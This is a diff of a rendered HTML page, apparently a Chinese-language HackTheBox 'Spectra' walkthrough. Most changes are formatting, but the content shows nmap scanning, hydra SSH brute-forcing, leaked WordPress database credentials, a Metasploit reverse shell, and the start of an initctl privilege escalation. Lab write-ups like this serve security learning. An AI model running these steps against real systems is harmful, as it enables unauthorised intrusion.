@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -285,8 +285,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate <span class="m">10000</span> -A -p- -T4 10.10.10.229
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --min-rate <span class="m">10000</span> -A -p- -T4 10.10.10.229
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果</p>
 <pre tabindex="0"><code>PORT     STATE SERVICE VERSION
@@ -295,7 +295,7 @@
 |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
 80/tcp   open  http    nginx 1.17.4
 |_http-server-header: nginx/1.17.4
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&#39;t have a title (text/html).
 3306/tcp open  mysql   MySQL (unauthorized)
 |_ssl-cert: ERROR: Script execution failed (use -d to debug)
 |_ssl-date: ERROR: Script execution failed (use -d to debug)
@@ -308,8 +308,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hydra -l root -P /usr/share/wordlists/fasttrack.txt 10.10.10.229 ssh -v
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l root -P /usr/share/wordlists/fasttrack.txt 10.10.10.229 ssh -v
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>失败</p>
 <h2 id="渗透过程"><a href="#渗透过程" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:渗透过程" class="headings">渗透过程</a></h2>
@@ -321,8 +321,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wpscan --url http://spectra.htb/main/
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url http://spectra.htb/main/
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫不出啥东西。。。</p>
 <p>另一个存在文件泄露，在<strong>wp-config.php.save</strong>文件中发现了数据库配置信息：</p>
@@ -338,15 +338,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/** The name of the database for WordPress */</span>
-<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;dev&#39;</span> <span class="p">);</span>
-<span class="sd">/** MySQL database username */</span>
-<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;devtest&#39;</span> <span class="p">);</span>
-<span class="sd">/** MySQL database password */</span>
-<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;devteam01&#39;</span> <span class="p">);</span>
-<span class="sd">/** MySQL hostname */</span>
-<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/** The name of the database for WordPress */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;dev&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="sd">/** MySQL database username */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;devtest&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="sd">/** MySQL database password */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;devteam01&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="sd">/** MySQL hostname */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>mysql只能本地连，那就后台登录，显示用户名未知，换成<strong>administrator</strong>就可以成功登录。</p>
 <p>成功登陆后我们就可以使用msf反弹shell</p>
@@ -363,7 +363,7 @@ run
 <pre tabindex="0"><code>cwd = os.getcwd()
 </code></pre><p>路径未知导致报错，所以我们要给一个路径，先切到<code>/tmp</code>目录下再生成终端就能成功</p>
 <pre tabindex="0"><code>cd /tmp
-python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
 </code></pre><h3 id="usertxt"><a href="#usertxt" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:usertxt" class="headings">user.txt</a></h3>
 <p>在<strong>katie</strong>用户目录下可以看到user.txt，但是由于权限问题无法读取，所以接下来的任务就是登录该用户获得flag。</p>
 <p>进入<code>/opt</code>(拼运气，蒙到就是赚到)，看到文件<code>autologin.conf.orig</code></p>
@@ -394,30 +394,30 @@ python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">description   <span class="s2">&#34;Automatic login at boot&#34;</span>
-author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
-<span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
-<span class="c1"># input.</span>
-start on started boot-complete
-script
-  <span class="nv">passwd</span><span class="o">=</span>
-  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
-  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
-    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
-      <span class="nb">break</span>
-    <span class="k">fi</span>
-  <span class="k">done</span>
-  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-    <span class="nb">exit</span> <span class="m">0</span>
-  <span class="k">fi</span>
-  <span class="c1"># Inject keys into the login prompt.</span>
-  <span class="c1">#</span>
-  <span class="c1"># For this to work, you must have already created an account on the device.</span>
-  <span class="c1"># Otherwise, no login prompt appears at boot and the injected keys do the</span>
-  <span class="c1"># wrong thing.</span>
-  /usr/local/sbin/inject-keys.py -s <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> -k enter
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">description   <span class="s2">&#34;Automatic login at boot&#34;</span>
+</span></span><span class="line"><span class="cl">author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># input.</span>
+</span></span><span class="line"><span class="cl">start on started boot-complete
+</span></span><span class="line"><span class="cl">script
+</span></span><span class="line"><span class="cl">  <span class="nv">passwd</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">  <span class="k">done</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Inject keys into the login prompt.</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># For this to work, you must have already created an account on the device.</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Otherwise, no login prompt appears at boot and the injected keys do the</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># wrong thing.</span>
+</span></span><span class="line"><span class="cl">  /usr/local/sbin/inject-keys.py -s <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> -k enter
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>虽然看不懂这脚本在干啥，但是可以看到它使用了什么目录，从目录中可以获得passwd：<strong>SummerHereWeCome!!</strong>，然后依次尝试ssh连接几个用户，成功登录katie获得user.txt(直接切换用户没成功，也不知道啥原因)</p>
 <pre tabindex="0"><code>ssh katie@10.10.10.229
@@ -438,12 +438,12 @@ initctl命令的作用是控制和管理init守护进程</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">initctl list <span class="p">|</span> grep <span class="nb">test</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">initctl list <span class="p">|</span> grep <span class="nb">test</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>都是stop状态，那么我们可以随便修改一个文件再启动就可以获得sudo权限。</p>
-<pre tabindex="0"><code>description &quot;Test node.js server&quot;
-author      &quot;katie&quot;
+<pre tabindex="0"><code>description &#34;Test node.js server&#34;
+author      &#34;katie&#34;
 
 start on filesystem or runlevel [2345]
 stop on shutdown
